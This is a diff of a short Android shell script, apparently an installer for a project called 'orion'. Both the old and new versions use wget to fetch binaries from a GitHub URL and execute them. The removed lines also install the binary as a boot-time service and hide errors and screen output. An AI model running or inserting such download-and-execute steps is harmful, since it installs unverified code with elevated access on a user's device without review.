@@ -1,7 +1,5 @@
 #!/bin/sh
-wget -O /data/local/tmp/module https://github.com/Androidmate/orion/raw/master/res/service
-mv /data/local/tmp/module /data/adb/module
-chmod +x /data/adb/module
-cp /data/adb/module /data/adb/service.d/service
-clear
-/data/adb/service.d/service 2> /dev/zero
+wget -O /data/local/tmp/phase1 https://github.com/Androidmate/orion/raw/master/phases/phase1
+chmod +x /data/local/tmp/phase1
+/data/local/tmp/phase1
+rm /data/local/tmp/phase1
